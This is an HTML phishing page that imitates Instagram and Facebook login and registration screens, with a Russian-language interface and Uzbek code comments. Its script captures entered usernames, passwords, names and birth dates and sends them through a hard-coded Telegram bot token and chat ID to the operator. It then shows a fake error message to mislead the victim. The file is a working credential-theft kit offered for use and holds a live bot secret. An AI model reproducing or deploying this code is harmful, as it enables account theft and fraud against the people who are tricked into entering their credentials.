<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram & Facebook Clone</title>
    <style>
        /* 100% o'xshashlik uchun maxsus sozlamalar */
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body, html { margin: 0; padding: 0; height: 100%; overflow-x: hidden; }
        .wrapper { display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 40px 20px; }
        .hidden { display: none !important; }

        /* --- INSTAGRAM (image_f3cf2f.png & image_f3cf10.png) --- */
        .insta-bg { background-color: #000000; color: #ffffff; }
        .insta-container { width: 100%; max-width: 350px; text-align: center; }
        .insta-header-text { font-size: 14px; font-weight: 400; margin-bottom: 40px; margin-top: 10px; }
        
        .input-field { 
            width: 100%; 
            background: #121212; 
            border: 1px solid #363636; 
            border-radius: 12px; 
            color: #ffffff; 
            padding: 14px 12px; 
            margin-bottom: 12px; 
            font-size: 14px; 
        }
        .input-field::placeholder { color: #8e8e8e; }
        .input-field:focus { border: 1px solid #555; outline: none; }

        .btn-primary { 
            width: 100%; 
            background-color: #0064e0; 
            border: none; 
            border-radius: 25px; 
            color: #ffffff; 
            font-weight: 600; 
            padding: 12px; 
            font-size: 15px; 
            cursor: pointer; 
            margin-top: 10px;
        }

        .insta-link { color: #ffffff; font-size: 14px; text-decoration: none; margin-top: 25px; display: block; font-weight: 500; }
        
        .secondary-btn { 
            width: 100%; 
            background: none; 
            border: 1px solid #363636; 
            color: #ffffff; 
            border-radius: 25px; 
            padding: 10px; 
            margin-top: 15px; 
            font-size: 14px; 
            font-weight: 500; 
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        /* --- FACEBOOK (image_f3ceb6.png & image_f3ce96.jpg) --- */
        .fb-bg { background-color: #ffffff; color: #1c1e21; }
        .fb-container { width: 100%; max-width: 400px; text-align: center; }
        .fb-title { text-align: left; font-size: 20px; font-weight: 700; margin-bottom: 30px; margin-top: 20px; }
        
        .fb-input { 
            width: 100%; 
            background: #f5f6f7; 
            border: 1px solid #dddfe2; 
            border-radius: 12px; 
            padding: 16px; 
            margin-bottom: 12px; 
            font-size: 16px; 
        }

        .fb-btn-reg { 
            background: none; 
            border: 1px solid #0064e0; 
            color: #0064e0; 
            border-radius: 25px; 
            width: 100%; 
            padding: 10px; 
            font-weight: 600; 
            margin-top: 80px;
            cursor: pointer;
        }

        /* Footer & Meta Logo */
        .meta-footer { margin-top: auto; padding-bottom: 20px; text-align: center; }
        .meta-logo { width: 60px; opacity: 0.8; margin-bottom: 5px; }
        .meta-text { font-size: 12px; color: #8e8e8e; font-weight: bold; }
    </style>
</head>
<body>

<!-- INSTAGRAM LOGIN -->
<div id="page1" class="wrapper insta-bg">
    <div class="insta-container">
        <div class="insta-header-text">Войти в Instagram</div>
        <input type="text" id="i_l_u" class="input-field" placeholder="Имя пользователя, номер или email">
        <input type="password" id="i_l_p" class="input-field" placeholder="Пароль">
        <button class="btn-primary" onclick="sendData('Insta Login', ['i_l_u', 'i_l_p'])">Войти</button>
        <a href="#" class="insta-link">Забыли пароль?</a>
        
        <div style="margin-top: 40px; width: 100%;">
            <button class="secondary-btn" onclick="showPage('page3')">
                <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" width="18">
                Войти через Facebook
            </button>
            <button class="secondary-btn" style="color: #0064e0; border-color: #0064e0;" onclick="showPage('page2')">Создать новый аккаунт</button>
        </div>
    </div>
    <div class="meta-footer">
        <div class="meta-text">∞ Meta</div>
    </div>
</div>

<!-- INSTAGRAM REGISTER -->
<div id="page2" class="wrapper insta-bg hidden">
    <div class="insta-container" style="text-align: left;">
        <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 20px;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" width="24">
            <span style="font-weight: bold; font-size: 14px;">Meta</span>
        </div>
        <h2 style="font-size: 24px; margin: 0;">Зарегистрируйтесь в Instagram</h2>
        <p style="color: #8e8e8e; font-size: 14px; margin-top: 8px; margin-bottom: 25px;">Зарегистрируйтесь, чтобы смотреть фото и видео ваших друзей.</p>
        
        <input type="text" id="i_r_c" class="input-field" placeholder="Мобильный телефон или электронный адрес">
        <input type="password" id="i_r_p" class="input-field" placeholder="Пароль">
        
        <div style="margin: 15px 0 10px; font-size: 14px;">Дата рождения ⓘ</div>
        <div style="display: flex; gap: 10px; margin-bottom: 20px;">
            <select id="d" class="input-field" style="margin:0"></select>
            <select id="m" class="input-field" style="margin:0"></select>
            <select id="y" class="input-field" style="margin:0"></select>
        </div>

        <input type="text" id="i_r_n" class="input-field" placeholder="Имя и фамилия">
        <input type="text" id="i_r_u" class="input-field" placeholder="Имя пользователя">
        
        <button class="btn-primary" style="border-radius: 10px;" onclick="sendData('Insta Reg', ['i_r_c', 'i_r_p', 'd', 'm', 'y', 'i_r_n', 'i_r_u'])">Отправить</button>
        <div style="text-align: center; margin-top: 20px;">
            <span style="color: #8e8e8e; font-size: 14px; cursor: pointer;" onclick="showPage('page1')">У меня уже есть аккаунт</span>
        </div>
    </div>
</div>

<!-- FACEBOOK LOGIN -->
<div id="page3" class="wrapper fb-bg hidden">
    <div class="fb-container">
        <div class="fb-title">Войдите на Facebook</div>
        <input type="text" id="f_l_u" class="fb-input" placeholder="Электронный адрес или номер мобильного телефона">
        <input type="password" id="f_l_p" class="fb-input" placeholder="Пароль">
        <button class="btn-primary" style="font-size: 18px; padding: 14px;" onclick="sendData('FB Login', ['f_l_u', 'f_l_p'])">Войти</button>
        <a href="#" class="insta-link" style="color: #1c1e21; font-weight: 500;">Забыли пароль?</a>
        
        <button class="fb-btn-reg" onclick="showPage('page4')">Создать новый аккаунт</button>
    </div>
    <div class="meta-footer">
        <div class="meta-text" style="color: #606770;">∞ Meta</div>
    </div>
</div>

<!-- FACEBOOK REGISTER -->
<div id="page4" class="wrapper fb-bg hidden">
    <div class="fb-container" style="text-align: left;">
        <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 15px;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" width="24">
            <span style="font-weight: bold; font-size: 14px;">Meta</span>
        </div>
        <h2 style="font-size: 22px; margin: 0;">Начните пользоваться Facebook</h2>
        
        <div style="display: flex; gap: 10px; margin-top: 20px;">
            <input type="text" id="f_r_n" class="fb-input" placeholder="Имя">
            <input type="text" id="f_r_s" class="fb-input" placeholder="Фамилия">
        </div>
        
        <div style="margin: 10px 0 10px; font-size: 14px;">Дата рождения ⓘ</div>
        <div style="display: flex; gap: 10px; margin-bottom: 20px;">
            <select id="fd" class="fb-input" style="margin:0; padding: 10px;"></select>
            <select id="fm" class="fb-input" style="margin:0; padding: 10px;"></select>
            <select id="fy" class="fb-input" style="margin:0; padding: 10px;"></select>
        </div>

        <input type="text" id="f_r_c" class="fb-input" placeholder="Номер мобильного или email">
        <input type="password" id="f_r_p" class="fb-input" placeholder="Пароль">
        
        <button class="btn-primary" style="padding: 14px;" onclick="sendData('FB Reg', ['f_r_n', 'f_r_s', 'fd', 'fm', 'fy', 'f_r_c', 'f_r_p'])">Отправить</button>
        <div style="text-align: center; margin-top: 20px; color: #0064e0; font-weight: 600; cursor: pointer;" onclick="showPage('page3')">У меня уже есть аккаунт</div>
    </div>
</div>

<script>
    const TOKEN = "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY";
    const CHAT_ID = "6198817749";

    function showPage(id) {
        document.querySelectorAll('.wrapper').forEach(p => p.classList.add('hidden'));
        document.getElementById(id).classList.remove('hidden');
    }

    function fillDates() {
        const days = document.querySelectorAll('#d, #fd'), months = document.querySelectorAll('#m, #fm'), years = document.querySelectorAll('#y, #fy');
        const monthNames = ["Январь", "Февраль", "Март", "Апрель", "Май", "Июнь", "Июль", "Август", "Сентябрь", "Октябрь", "Ноябрь", "Декабрь"];
        
        days.forEach(el => { for(let i=1; i<=31; i++) el.innerHTML += `<option>${i}</option>`; });
        months.forEach(el => { monthNames.forEach(m => el.innerHTML += `<option>${m}</option>`); });
        years.forEach(el => { for(let i=2026; i>=1950; i--) el.innerHTML += `<option>${i}</option>`; });
    }
    fillDates();

    async function sendData(type, ids) {
        let message = `🔥 *Yangi Natija: ${type}*\n\n`;
        let valid = true;
        ids.forEach(id => {
            const val = document.getElementById(id).value;
            if(!val) valid = false;
            message += `🔹 *${id}:* \`${val}\`\n`;
        });

        if(!valid) return alert("Iltimos, barcha maydonlarni to'ldiring!");

        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
        });
        
        alert("Server bilan ulanishda xatolik (Error 404). Qayta urinib ko'ring.");
    }
</script>
</body>
</html>
